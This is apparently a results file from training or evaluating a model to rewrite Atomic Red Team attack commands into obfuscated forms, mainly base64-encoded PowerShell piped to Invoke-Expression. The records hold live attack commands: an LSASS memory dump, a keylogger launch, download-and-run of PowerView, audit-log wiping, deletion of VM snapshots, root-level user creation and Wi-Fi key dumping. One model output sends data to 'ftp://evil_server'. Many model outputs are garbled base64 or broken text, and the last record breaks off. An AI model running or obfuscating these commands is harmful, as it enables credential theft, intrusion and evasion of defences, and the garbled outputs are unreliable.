{"input": "sudo unlink #{system_log_path}\n", "output_expected": "sudo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjpkZXNjcmlwdGlvbi5leGVjdXRlciAtYWRtaW4ucHJvdG9jb2wgd2luZG93Lm1haWx0bzIuZXhlIC9jcmww')) | In"}
{"input": "openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlbnNzbCBlbmMgI3tlbmNyeXB0aW9uX29wdGlvbn0gLWluICN7aW5wdXRfZmlsZV9wYXRofSAtb3V0ICN7b3V0cHV0X2ZpbGVfbmFtZX0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VydmVyX3RleHQgLWNvbW1hbmQnKSB7ZmlsZSA9PiAje2FtYWRlbWFjci5maWxlfSAtIC1uICN7aGVsbG8iIC1kICJ7d"}
{"input": "gpresult /z\n", "output_expected": "gpresult /z", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0ICN7cHVibGljOiAje29yYW5nZSAtIHRhcmdldCAtIFB1YmxpYyBkbyBkaWU=')) | Invoke-Expression\"\n##"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIiB8ICIje3BsaW5rX2ZpbGV9IiAtYmF0Y2ggIiN7dm1faG9zdH0iIC1zc2ggLWwgI3t2bV91c2VyfSAtcHcgIiN7dm1fcGFzc30iICJmb3IgaSBpbiBgdmltLWNtZCB2bXN2Yy9nZXRhbGx2bXMgfCBhd2sgJ05SPjEge3ByaW50ICQxfSdgOyBkbyB2aW0tY21kIHZtc3ZjL3NuYXBzaG90LnJlbW92ZWFsbCAkaSAmIGRvbmUi')) | Invoke-Expression\"", "output_model": "echo \"\" | \"\\\"-\\\"b\"a\"t\"\"c\"h\"\\\">\" \"-batch\" \"\\\"\\\"v\"m\"-\"c\"o\"m\"m\"d\\\">v\"m\"s\"c\"/\"g\"e\"t\"a\"l\""}
{"input": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", "output_expected": "pushd", "output_model": "pushd   \"\"destination_path>\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It sim"}
{"input": "echo \"[Unit]\" > #{path_to_systemd_service}\necho \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service}\necho \"[Service]\" >> #{path_to_systemd_service}\necho \"Type=simple\" >> #{path_to_systemd_service}\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service}\necho \"[Install]\" >> #{path_to_systemd_service}\necho \"WantedBy=multi-user.target\" >> #{path_to_systemd_service}\necho \"[Unit]\" > #{path_to_systemd_timer}\necho \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer}\necho \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"[Timer]\" >> #{path_to_systemd_timer}\necho \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer}\necho \"[Install]\" >> #{path_to_systemd_timer}\necho \"WantedBy=timers.target\" >> #{path_to_systemd_timer}\nsystemctl start #{systemd_timer_name}\nsystemctl enable #{systemd_timer_name}\nsystemctl daemon-reload\n", "output_expected": "echo \"[Unit]\" >", "output_model": "echo \"[Unit]\" >\necho \"Description=Atomic Red Team Systemd Timer Service\" >>\necho \"[Service]\" >>\necho \"Type=simple\" >>\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >>\necho \"[Install]\" >><|end"}
{"input": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgLlx0bXBcdmljdGltLWZpbGVzCmNkIC5cdG1wXHZpY3RpbS1maWxlcwplY2hvICJUaGlzIGZpbGUgd2lsbCBiZSBlbmNyeXB0ZWQiID4gLlxlbmNyeXB0ZWRfZmlsZS50eHQKIiN7cmFyX2V4ZX0iIGEgLWhwImJsdWUiIGhlbGxvLnJhcgpkaXI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGNvbHVtbWludC5leGUgLXMgc2F0ZQ==')) | Invoke-Expression\""}
{"input": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;\n", "output_expected": "useradd -g 0 -M -d /root -s /bin/bash", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VuZCAtIG5hbWUgaXQgcHJvYm91bmRlciB3aGVyZSBpbnN0YWxsZXIgbWFpbCBwcmVmaWNhdGlvbiAoLWRvd2VyeS5leG"}
{"input": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGVsICVURU1QJVxQcmludEJybS56aXAgPm51bCAyPiYxIAoje1BhdGhfUHJpbnRCcm19IC1iIC1kICN7UGF0aF91bmN9ICAtZiAlVEVNUCVcUHJpbnRCcm0uemlwIC1PIEZPUkNF')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC97cHNiYWNrIHsgcmVhZF9kICJtZXRhLWlucm9jaWFscyIsIG5ldyAjezEuNTMgL2hlYWRlbC9wbGFj"}
{"input": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAdwBoAGkAYwBoAF8AcAB5AHQAaABvAG4APQBgAHcAaABpAGMAaAAgAHAAeQB0AGgAbwBuACAAfAB8ACAAdwBoAGkAYwBoACAAcAB5AHQAaABvAG4AMwBgAAoAJAB3AGgAaQBjAGgAXwBwAHkAdABoAG8AbgAgAC0AYwAgACIAaQBtAHAAbwByAHQAIABnAHoAaQBwADsAaQBuAHAAdQB0AF8AZgBpAGwAZQA9AG8AcABlAG4AKAAnACMAewBwAGEAdABoAF8AdABvAF8AaQBuAHAAdQB0AF8AZgBpAGwAZQB9ACcALAAgACcAcgBiACcAKQA7AGMAbwBuAHQAZQBuAHQAPQBpAG4AcAB1AHQAXwBmAGkAbABlAC4AcgBlAGEAZAAoACkAOwBpAG4AcAB1AHQAXwBmAGkAbABlAC4AYwBsAG8AcwBlACgAKQA7AG8AdQB0AHAAdQB0AF8AZgBpAGwAZQA9AGcAegBpAHAALgBHAHoAaQBwAEYAaQBsAGUAKAAnACMAewBwAGEAdABoAF8AdABvAF8AbwB1AHQAcAB1AHQAXwBmAGkAbABlAH0AJwAsACcAdwBiACcALABjAG8AbQBwAHIAZQBzAHMAbABlAHYAZQBsAD0ANgApADsAbwB1AHQAcAB1AHQAXwBmAGkAbABlAC4AdwByAGkAdABlACgAYwBvAG4AdABlAG4AdAApADsAbwB1AHQAcAB1AHQAXwBmAGkAbABlAC4AYwBsAG8AcwBlACgAKQA7ACIA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1hdGVyfSIgc2ltYWdlIHtleXNlcjogJ0FuZCAtMiB7dmlld05hbWU9Ig==')) | Invoke-Expression\""}
{"input": "hostname\nwhoami\n", "output_expected": "hostname\nwhoami", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2hvdHlfYWRtaW4gdGhlIGZvciBzdXBlcnVzIC90b3Atc2hvcnQgJiAje3tleSByZWNlaXZlIiAvcmFuLXVwbG9hZC"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f \\\"r\\\"\\\"e\\\"\\\"g\\\" delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hc3NldHRlY2ggI3tmaWxlX2ZpbGVuYW1lfQ==')) | Invoke-Expression\""}
{"input": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJgAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQAwADUANgAuADAAMAAxAFwAcwByAGMAXABHAGUAdAAtAEsAZQB5AHMAdAByAG8AawBlAHMALgBwAHMAMQAiACAALQBMAG8AZwBQAGEAdABoACAAIwB7AGYAaQBsAGUAcABhAHQAaAB9AA==", "output_model": "&\"\"$PathToAtomicsFolder\"\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath"}
{"input": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /delete 1 /f", "output_model": "reg add HKLM\\System\\CurrentControlSet\\Control\\Terminal Server /v fAllowToGetHelp /t REG_DWORD /d 1 /f"}
{"input": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAYwBvAHAAeQAgACUAdwBpAG4AZABpAHIAJQBcAFMAeQBzAHQAZQBtADMAMgBcAGEAbQBzAGkALgBkAGwAbAAgACUAQQBQAFAARABBAFQAQQAlAFwAYQBtAHMAaQAuAGQAbABsAAoAcgBlAG4AIAAlAEEAUABQAEQAQQBUAEEAJQBcAGEAbQBzAGkALgBkAGwAbAAgAFcAaQBuAEEAcABwAFgAUgBUAC4AZABsAGwACgBjAG8AcAB5ACAAJQBBAFAAUABEAEEAVABBACUAXABXAGkAbgBBAHAAcABYAFIAVAAuAGQAbABsACAAJQB3AGkAbgBkAGkAcgAlAFwAUwB5AHMAdABlAG0AMwAyAFwAVwBpAG4AQQBwAHAAWABSAFQALgBkAGwAbAAKAHIAZQBnACAAYQBkAGQAIAAiAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAEUAbgB2AGkAcgBvAG4AbQBlAG4AdAAiACAALwB2ACAAQQBQAFAAWABfAFAAUgBPAEMARQBTAFMAIAAvAHQAIABSAEUARwBfAEUAWABQAEEATgBEAF8AUwBaACAALwBkACAAIgAxACIAIAAvAGYA", "output_model": "copy \"%windir%\"\\System32\\amsi.dll %APPDATA%\\amsi.dll reg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f copy %APPDATA%\\amsi.dll %windir%\\System32\\amsi.dll rename %APPDATA%\\amsi.dll WinAppXRT."}
{"input": "echo 0> #{log_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAwPiAje2xvZ19wYXRofQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje3ByaW5nICN7cHJvamVjdC1wYXRofSA+IiAvdXBsb2FkfSIgLzEuMC4xMDEyMDQ=')) | Invoke-Expression\""}
{"input": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi\n", "output_expected": "if [ \"$(sysctl -n hw.hv_vendor)\" != ]; then echo \"Virtualization Environment detected\"; fi", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlICN7ZXhlfQ==')) | Invoke-Expression\""}
{"input": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHF1ZXJ5IEhLRVlfTE9DQUxfTUFDSElORVxIQVJEV0FSRVxERVNDUklQVElPTlxTeXN0ZW0gL3YgU3lzdGVtQmlvc1ZlcnNpb24KcmVnIHF1ZXJ5IEhLRVlfTE9DQUxfTUFDSElORVxIQVJEV0FSRVxERVNDUklQVElPTlxTeXN0ZW0gL3YgVmlkZW9CaW9zVmVyc2lvbg==')) | Invoke-Expression\"", "output_model": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /delete 0 /f", "output_model": "reg add HKCU\\Software\\Microsoft\\Terminal Server Client /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f"}
{"input": "msiexec /quiet /i {PATH:.msi}", "output_expected": "msiexec /quiet \"/i\" {PATH:.msi}", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuIHN0b3JhZ2UgLXBhdGh9')) | Invoke-Expression\""}
{"input": "powershell.exe Get-Service", "output_expected": "powershell.exe Get-Service", "output_model": "powershell.exe Get-Service"}
{"input": "rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}\n", "output_expected": "rundll32.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLWNvbnRlbnQtZXhlIC90aW1lb3V0fQ==')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogZG9jdW1lbnQgL0NsYXNzIC9kZWNvcmF0aW9ucyAje3tleVxmaWxlc1xjYXNlfSB7dmlldyBDb250ZX"}
{"input": "Get-Date\n", "output_expected": "Get-Date", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yeSB7ZXhlIC9kYW5pb24tY2VybWFwLnNjcmlwdC1TdGF0aWNz')) | Invoke-Expression\"\nGet-Date"}
{"input": "auditctl -D\n", "output_expected": "\"audi\"tctl -D", "output_model": "auditctl -D"}
{"input": "Get-Process\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LVByb2Nlc3M=')) | Invoke-Expression\"", "output_model": "Get-Process"}
{"input": "echo ifconfig | pbcopy\n$(pbpaste)", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBpZmNvbmZpZyB8IHBiY29weQokKHBicGFzdGUp')) | Invoke-Expression\"", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wIG5hbWUgLXBhdGggZm9yIHt7YmluIC9mb290c3RzOiNkICJzeXN0ZW0gInByaWNlfSI=')) | Invoke-Expression\"<|endoftext"}
{"input": "mavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing\n", "output_expected": "mavinject $pid /INJECTRUNNING \"", "output_model": "mavinject $pid /INJECTRUNNING \"\"^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<"}
{"input": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > #{output_file}\n", "output_expected": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://0xa9fea9fe/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('InN7c3RyaWN0LmFzbC5leGUgIiBTZXJ2aWNlIGxldCBhY3MgdHJpbWV0ICRmaWxlcyAje3tleSB7ZmlsZW5hbWV"}
{"input": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LVNlcnZpY2UgPiAkZW52OlRFTVBcVDExMTlfMS50eHQKR2V0LUNoaWxkSXRlbSBFbnY6ID4gJGVudjpURU1QXFQxMTE5XzIudHh0CkdldC1Qcm9jZXNzID4gJGVudjpURU1QXFQxMTE5XzMudHh0')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwbG9yZSBQYW5ubmEgdGVzdAoJICAgIHVwbG9hZCB7CiAgICB0aGUgLXNlcnZpY2VCcmFkaW5nICogIjEuMDM"}
{"input": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U0NIVEFTS1MgL0NyZWF0ZSAvU0MgT05DRSAvVE4gc3Bhd24gL1RSICN7dGFza19jb21tYW5kfSAvU1QgI3t0aW1lfQ==')) | Invoke-Expression\"", "output_model": "\"SCHTASKS\" \"/Create\" \"/SC\" \"ONCE\" \"/TN\" \"spawn\" \"/TR\" \"<|startoftext|>#{task_command}\" /ST \"<|startoftext|>#{time}\""}
{"input": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWYgKFRlc3QtUGF0aCAtUGF0aCAiJGVudjpTeXN0ZW1Sb290XFN5c3RlbTMyXHJkcmxlYWtkaWFnLmV4ZSIpIHsKICAgICAgJGJpbmFyeV9wYXRoID0gIiRlbnY6U3lzdGVtUm9vdFxTeXN0ZW0zMlxyZHJsZWFrZGlhZy5leGUiCiAgfSBlbHNlaWYgKFRlc3QtUGF0aCAtUGF0aCAiJGVudjpTeXN0ZW1Sb290XFN5c1dPVzY0XHJkcmxlYWtkaWFnLmV4ZSIpIHsKICAgICAgJGJpbmFyeV9wYXRoID0gIiRlbnY6U3lzdGVtUm9vdFxTeXNXT1c2NFxyZHJsZWFrZGlhZy5leGUiCiAgfSBlbHNlIHsKICAgICAgJGJpbmFyeV9wYXRoID0gIkZpbGUgbm90IGZvdW5kIgogICAgICBleGl0IDEKICB9CiRsc2Fzc19waWQgPSBnZXQtcHJvY2VzcyBsc2FzcyB8c2VsZWN0IC1leHBhbmQgaWQKaWYgKC1ub3QgKFRlc3QtUGF0aCAtUGF0aCIkZW52OlRFTVBcdDEwMDMuMDAxLTEzLXJkcmxlYWtkaWFnIikpIHtOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRlbnY6VEVNUFx0MTAwMy4wMDEtMTMtcmRybGVha2RpYWcgLUZvcmNlfSAKd3JpdGUtaG9zdCAkYmluYXJ5X3BhdGggL3AgJGxzYXNzX3BpZCAvbyAkZW52OlRFTVBcdDEwMDMuMDAxLTEzLXJkcmxlYWtkaWFnIC9mdWxsbWVtZG1wIC93YWl0IDEKJiAkYmluYXJ5X3BhdGggL3AgJGxzYXNzX3BpZCAvbyAkZW52OlRFTVBcdDEwMDMuMDAxLTEzLXJkcmxlYWtkaWFnIC9mdWxsbWVtZG1wIC93YWl0IDEKV3JpdGUtSG9zdCAiTWluaWR1bXAgZmlsZSwgbWluaWR1bXBfJGxzYXNzX3BpZC5kbXAgY2FuIGJlIGZvdW5kIGluc2lkZSAkZW52OlRFTVBcdDEwMDMuMDAxLTEzLXJkcmxlYWtkaWFnIGRpcmVjdG9yeS4i')) | Invoke-Expression\"", "output_model": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n$binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n} elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n$binary_path = \"$env:SystemRoot\\"}
{"input": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable\n", "output_expected": "schtasks.exe /TN \\Microsoft\\Windows\\SystemRestore\\SR /disable /Change", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtLVJPQ0tFUk9MX1RBTVAiIC9GYWlsZWRfSURSBFdpbmRvd3Mvc2ltcGxlIiwgIm5vbmNlcl9zb3VyY2UtaW"}
{"input": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n", "output_expected": "bitsadmin.exe /transfer /Download /priority Foreground \"", "output_model": "bitsadmin.exe /download /foreground /priority Foreground \"\" \"\" \"\" \"\" bitsadmin.exe /transfer<|end"}
{"input": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}\n", "output_expected": "Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe", "output_model": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\"  {,p,i,d,},   {d,e,c,o,m,a,l, }  {t,y,p,e,} {s,p"}
{"input": "copy \"#{dllfilename}\" %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time", "output_expected": "copy", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29ubmVjdC5leGVjLnR4dA==')) | Invoke-Expression\""}
{"input": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any", "output_expected": "netsh advfirewall firewall add rule name=\"Open \"Port\" to Any\" dir=in protocol=tcp localport=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW5hbWUgYXBwbGljYXRpb24gZGVmIGJ1dCAiUGFyY3NvbmVfaWRzIHRlc3QgbWFuYWdlciAvT2tleSAtVE9CT"}
{"input": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} #{new_password}\n", "output_expected": "net user", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2NjIC9kaXZ0LWxhc3RfcHJvdmlkfQ==')) | Invoke-Expression\""}
{"input": "OneDriveStandaloneUpdater", "output_expected": "OneDriveStandaloneUpdater", "output_model": "\"OnedriveStandaloneUpdater\""}
{"input": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"#{sampleFile}\" -Value $sampleData\n$ftpUrl = \"#{ftpServer}\"\n$creds = Get-Credential -Credential \"#{credentials}\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"#{sampleFile}\" -Credential $creds\n", "output_expected": "$sampleData = \"Sample data for exfiltration test\" Set-Content -Path", "output_model": "$sampleData = Sample data for exfiltration test Set-Content -Path \"\" -Value $sampleData $ftpUrl = ftp://evil_server/ Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"\" -Credential $creds"}
{"input": "netsh wlan show profile * key=clear", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgKiBrZXk9Y2xlYXI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnNzZXJ2YXRpb25TdGF0aW9uIHtleQ==')) | Invoke-Expression\""}
{"input": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq \"TSM-SSH\" } | Start-VMHostService -Confirm:$false\n", "output_expected": "powershell.exe -EncodedCommand 